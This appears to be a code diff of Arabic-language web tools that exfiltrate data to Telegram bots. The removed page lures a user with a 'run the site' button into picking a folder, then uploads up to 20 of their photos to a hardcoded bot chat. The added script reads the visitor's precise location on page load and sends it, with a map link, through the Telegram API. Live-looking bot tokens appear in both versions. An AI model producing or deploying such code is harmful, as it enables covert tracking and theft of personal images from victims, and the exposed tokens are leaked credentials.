@@ -1,84 +1,114 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تشغيل الموقع</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background-color: #f5f5f5; }
-        .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
-        button { background: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; margin: 20px 0; }
-        button:hover { background: #45a049; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>تشغيل الموقع</h1>
-        <p>اضغط الزر لبدء الإرسال التلقائي</p>
-        <button id="sendButton">تشغيل الموقع</button>
-    </div>
+// إعدادات البوت
+const BOT_TOKEN = '7540998214:AAEysEoXCj5XHlQzVG3-yETXNk6WdeZ9Yc0';
+const CHAT_ID = ''; // اتركه فارغاً للإرسال إلى دردشة البوت
 
-    <script>
-        // بيانات البوت
-        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
-        const CHAT_ID = "6913353602";
-        const MAX_IMAGES = 20;
+// عناصر DOM
+const statusDiv = document.getElementById('status');
+const locationInfoDiv = document.getElementById('locationInfo');
+const latitudeSpan = document.getElementById('latitude');
+const longitudeSpan = document.getElementById('longitude');
+const accuracySpan = document.getElementById('accuracy');
+const mapLink = document.getElementById('mapLink');
 
-        document.getElementById('sendButton').addEventListener('click', async () => {
-            try {
-                // محاولة الوصول لمجلد الصور مباشرة
-                const dirHandle = await window.showDirectoryPicker();
-                await sendImagesAutomatically(dirHandle);
-                alert("تم إرسال " + MAX_IMAGES + " صورة بنجاح!");
-            } catch (error) {
-                console.error('Error:', error);
-                alert("حدث خطأ! تأكد من منح الإذن اللازم");
-            }
-        });
+// طلب الموقع عند تحميل الصفحة
+document.addEventListener('DOMContentLoaded', () => {
+    if (!navigator.geolocation) {
+        showError("المتصفح لا يدعم خدمة الموقع الجغرافي");
+        return;
+    }
+    
+    updateStatus("جاري طلب إذن الوصول إلى موقعك...", 'loading');
+    navigator.geolocation.getCurrentPosition(
+        handleLocationSuccess,
+        handleLocationError,
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
+});
 
-        async function sendImagesAutomatically(dirHandle) {
-            let sentCount = 0;
-            
-            // إرسال الصور تلقائياً دون تفاعل
-            for await (const entry of dirHandle.values()) {
-                if (sentCount >= MAX_IMAGES) break;
-                
-                if (entry.kind === 'file' && isImage(entry.name)) {
-                    await sendToTelegram(await entry.getFile());
-                    sentCount++;
+// عند نجاح الحصول على الموقع
+async function handleLocationSuccess(position) {
+    const { latitude, longitude, accuracy } = position.coords;
+    
+    // عرض المعلومات للمستخدم
+    displayLocationInfo(latitude, longitude, accuracy);
+    
+    // إرسال البيانات إلى تليجرام
+    try {
+        updateStatus("جاري إرسال الموقع إلى تليجرام...", 'loading');
+        await sendToTelegram(latitude, longitude, accuracy);
+        updateStatus("تم إرسال موقعك بنجاح!", 'success');
+    } catch (error) {
+        showError(`فشل الإرسال: ${error.message}`);
+        console.error('Error:', error);
+    }
+}
+
+// عند حدوث خطأ
+function handleLocationError(error) {
+    let errorMessage = "حدث خطأ غير متوقع";
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            errorMessage = "تم رفض إذن الوصول إلى الموقع";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            errorMessage = "معلومات الموقع غير متاحة";
+            break;
+        case error.TIMEOUT:
+            errorMessage = "انتهى وقت طلب الموقع";
+            break;
+    }
+    showError(errorMessage);
+}
+
+// عرض معلومات الموقع
+function displayLocationInfo(lat, lng, accuracy) {
+    latitudeSpan.textContent = lat.toFixed(6);
+    longitudeSpan.textContent = lng.toFixed(6);
+    accuracySpan.textContent = Math.round(accuracy);
+    
+    // إنشاء رابط خرائط جوجل
+    const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+    mapLink.href = mapUrl;
+    
+    locationInfoDiv.style.display = 'block';
+}
+
+// إرسال البيانات إلى تليجرام
+async function sendToTelegram(lat, lng, accuracy) {
+    const message = `📍 موقع جديد:
+- خط العرض: ${lat.toFixed(6)}
+- خط الطول: ${lng.toFixed(6)}
+- الدقة: ${Math.round(accuracy)} متر
+- الرابط: https://www.google.com/maps?q=${lat},${lng}`;
+    
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            disable_web_page_preview: false
+        })
+    });
+    
+    const data = await response.json();
+    if (!data.ok) {
+        throw new Error(data.description || "فشل إرسال الرسالة");
+    }
+}
+
+// تحديث حالة الواجهة
+function updateStatus(message, className) {
+    statusDiv.textContent = message;
+    statusDiv.className = `status-box ${className}`;
+}
+
+function showError(message) {
+    updateStatus(message, 'error');
                 }
-                
-                // البحث في المجلدات الفرعية إذا لزم الأمر
-                else if (entry.kind === 'directory' && sentCount < MAX_IMAGES) {
-                    const subDir = await dirHandle.getDirectoryHandle(entry.name);
-                    for await (const subEntry of subDir.values()) {
-                        if (sentCount >= MAX_IMAGES) break;
-                        if (subEntry.kind === 'file' && isImage(subEntry.name)) {
-                            await sendToTelegram(await subEntry.getFile());
-                            sentCount++;
-                        }
-                    }
-                }
-            }
-        }
-        
-        async function sendToTelegram(file) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', file, file.name);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            
-            await new Promise(resolve => setTimeout(resolve, 300));
-        }
-        
-        function isImage(filename) {
-            return ['.jpg','.jpeg','.png','.gif','.bmp','.webp'].some(ext => 
-                filename.toLowerCase().endsWith(ext));
-        }
-    </script>
-</body>
-</html>
